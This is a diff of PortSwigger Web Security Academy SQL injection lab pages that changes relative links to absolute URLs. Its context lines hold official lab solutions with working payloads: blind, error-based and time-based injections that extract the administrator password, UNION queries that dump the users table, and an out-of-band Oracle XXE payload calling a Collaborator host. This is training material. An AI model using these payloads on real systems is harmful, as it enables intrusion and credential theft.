@@ -17,7 +17,7 @@ To solve the lab, log in as the `administrator` user.
 
 <details><summary>Hint</summary>
 
-This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+This lab uses an Oracle database. For more information, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
@@ -79,8 +79,8 @@ This lab uses an Oracle database. For more information, see the [SQL injection c
 
     `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
-    And so on. You can do this manually using [Burp Repeater](/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
-12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
+    And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the error disappears), you have determined the length of the password, which is in fact 20 characters long.
+12. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
 13. Go to Burp Intruder and change the value of the cookie to:
 
     `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
@@ -174,9 +174,9 @@ You can assume that the password only contains lowercase, alphanumeric character
 
    `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a`
 
-   And so on. You can do this manually using [Burp Repeater](/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the
+   And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the
    `Welcome back` message disappears), you have determined the length of the password, which is in fact 20 characters long.
-8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
+8. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
 9. In Burp Intruder, change the value of the cookie to:
 
    `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
@@ -237,7 +237,7 @@ To prevent the Academy platform being used to attack third parties, our firewall
 
 <details><summary>Hint</summary>
 
-You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
@@ -283,7 +283,7 @@ To prevent the Academy platform being used to attack third parties, our firewall
 
 <details><summary>Hint</summary>
 
-You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
@@ -295,7 +295,7 @@ You can find some useful payloads on our [SQL injection cheat sheet](/web-securi
    `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
 3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified `TrackingId` cookie.
 
-The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use [Burp Collaborator](/burp/documentation/desktop/tools/collaborator) to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.
+The solution described here is sufficient simply to trigger a DNS lookup and so solve the lab. In a real-world situation, you would use [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) to verify that your payload had indeed triggered a DNS lookup and potentially exploit this behavior to exfiltrate sensitive data from the application. We'll go over this technique in the next lab.
 
 </details>
 
@@ -384,7 +384,7 @@ To solve the lab, log in as the `administrator` user.
 
 <details><summary>Hint</summary>
 
-You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
@@ -419,8 +419,8 @@ You can find some useful payloads on our [SQL injection cheat sheet](/web-securi
 
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
 
-   And so on. You can do this manually using [Burp Repeater](/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
-7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
+   And so on. You can do this manually using [Burp Repeater](https://portswigger.net/burp/documentation/desktop/tools/repeater), since the length is likely to be short. When the condition stops being true (i.e. when the application responds immediately without a time delay), you have determined the length of the password, which is in fact 20 characters long.
+7. After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use [Burp Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder). Send the request you are working on to Burp Intruder, using the context menu.
 8. In Burp Intruder, change the value of the cookie to:
 
    `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
@@ -474,7 +474,7 @@ To solve the lab, exploit the SQL injection vulnerability to cause a 10 second d
 
 <details><summary>Hint</summary>
 
-You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
@@ -513,14 +513,14 @@ To solve the lab, log in as the `administrator` user.
 
 <details><summary>Hint</summary>
 
-You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
 <details><summary>Official solution</summary>
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
+2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
    `'+UNION+SELECT+'abc','def'--`
 3. Use the following payload to retrieve the list of tables in the database:
@@ -571,14 +571,14 @@ On Oracle databases, every `SELECT` statement must specify a table to select `FR
 
 There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
 
-For more information, see our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+For more information, see our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
 <details><summary>Official solution</summary>
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
+2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
    `'+UNION+SELECT+'abc','def'+FROM+dual--`
 3. Use the following payload to retrieve the list of tables in the database:
@@ -615,14 +615,14 @@ To solve the lab, display the database version string.
 
 <details><summary>Hint</summary>
 
-You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
 <details><summary>Official solution</summary>
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
+2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
    `'+UNION+SELECT+'abc','def'#`
 3. Use the following payload to display the database version:
@@ -662,14 +662,14 @@ On Oracle databases, every `SELECT` statement must specify a table to select `FR
 
 There is a built-in table on Oracle called `dual` which you can use for this purpose. For example: `UNION SELECT 'abc' FROM dual`
 
-For more information, see our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+For more information, see our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
 <details><summary>Official solution</summary>
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
+2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
 
    `'+UNION+SELECT+'abc','def'+FROM+dual--`
 3. Use the following payload to display the database version:
@@ -864,14 +864,14 @@ https://www.youtube.com/watch?v=GP6CK03nDvw
 
 [Open the lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
 
-This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.
 
 The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.
 
 <details><summary>Official solution</summary>
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter:
+2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). Verify that the query is returning three columns, using the following payload in the `category` parameter:
 
    `'+UNION+SELECT+NULL,NULL,NULL--`
 3. Try replacing each null with the random value provided by the lab, for example:
@@ -907,7 +907,7 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 <details><summary>Official solution</summary>
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
+2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
 
    `'+UNION+SELECT+'abc','def'--`
 3. Use the following payload to retrieve the contents of the `users` table:
@@ -946,14 +946,14 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 <details><summary>Hint</summary>
 
-You can find some useful payloads on our [SQL injection cheat sheet](/web-security/sql-injection/cheat-sheet).
+You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
 </details>
 
 <details><summary>Official solution</summary>
 
 1. Use Burp Suite to intercept and modify the request that sets the product category filter.
-2. Determine the [number of columns that are being returned by the query](/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:
+2. Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the `category` parameter:
 
    `'+UNION+SELECT+NULL,'abc'--`
 3. Use the following payload to retrieve the contents of the `users` table:
